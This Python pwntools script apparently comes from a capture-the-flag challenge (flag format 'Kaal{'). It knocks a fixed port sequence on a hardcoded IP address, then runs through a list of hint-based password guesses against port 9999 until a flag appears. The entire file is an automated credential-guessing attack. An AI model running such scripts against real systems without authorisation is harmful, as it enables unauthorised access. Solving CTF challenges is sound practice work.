#!/usr/bin/env python3
"""
Try creative password combinations based on challenge hints
"""

from pwn import *
import time
import hashlib

context.log_level = 'error'

target_ip = "13.206.58.35"
target_port = 9999

def knock_ports():
    sequence = [9000, 2600, 1337]
    for port in sequence:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, port))
            s.close()
        except:
            pass
        time.sleep(0.2)
    time.sleep(0.8)

def try_password(pwd):
    try:
        knock_ports()
        conn = remote(target_ip, target_port)
        conn.recvuntil(b"password:")
        conn.sendline(pwd.encode() if isinstance(pwd, str) else pwd)
        
        response = conn.recvall(timeout=2)
        conn.close()
        
        return response.decode('utf-8', errors='ignore')
    except:
        return ""

print("[*] Trying creative password combinations...\n")

passwords = [
    # Knock sequence as password
    "9000-2600-1337",
    "9000:2600:1337",
    "9000_2600_1337",
    "9000 2600 1337",
    "900026001337",
    
    # Reverse
    "1337-2600-9000",
    "133726009000",
    
    # With KAAL
    "KAAL:9000:2600:1337",
    "KAAL-9000-2600-1337",
    "KAAL_9000_2600_1337",
    
    # Hashes
    hashlib.md5(b"KAAL").hexdigest(),
    hashlib.md5(b"9000-2600-1337").hexdigest(),
    hashlib.sha1(b"KAAL").hexdigest(),
    
    # Leetspeak transformations
    "K44L",
    "k44l",
    "K@AL",
    "k@al",
    
    # Phone phreaking terms
    "2600hz",
    "bluebox",
    "redbox",
    "phreaker",
    "captaincrunch",
    "joebubba",
    
    # Dragon Ball references
    "over9000",
    "over_9000",
    "OVER9000",
    "9001",  # Technically "over 9000"
    "vegeta",
    "goku",
    "saiyan",
    "powerLevel",
    
    # Era-specific (2000s)
    "y2k",
    "millennium",
    "2000",
    
    # Combinations with numbers
    "elite1337",
    "phreaker2600",
    "warrior9000",
    
    # The actual knock sequence
    "knock:9000:2600:1337",
    "sequence:9000:2600:1337",
    
    # Maybe it's asking for the port sequence?
    "9000",
    "2600",
    "1337",
    
    # Try the challenge author
    "Glitch3r",
    "glitch3r",
    "GLITCH3R",
    
    # SECTOR-7 variations
    "SECTOR7",
    "sector-7",
    "sector_7",
    "S3CT0R7",
    "s3ct0r-7",
    
    # "He who knocks"
    "heisenberg",  # Breaking Bad reference
    "knock",
    "knockknock",
    
    # Try the flag format itself
    "Kaal",
    "Kaal{}",
    
    # Binary/hex representations
    hex(9000)[2:] + hex(2600)[2:] + hex(1337)[2:],
    bin(9000)[2:] + bin(2600)[2:] + bin(1337)[2:],
]

for pwd in passwords:
    print(f"[*] Trying: {pwd[:40]:40s} ... ", end="", flush=True)
    result = try_password(pwd)
    
    if "denied" not in result.lower() and result:
        print(f"\n[!!!] POSSIBLE SUCCESS!")
        print(f"Response:\n{result}")
        break
    elif "flag" in result.lower() or "kaal{" in result.lower():
        print(f"\n[!!!] FOUND FLAG!")
        print(f"Response:\n{result}")
        break
    else:
        print("✗")
    
    time.sleep(0.8)

print("\n[*] Complete")
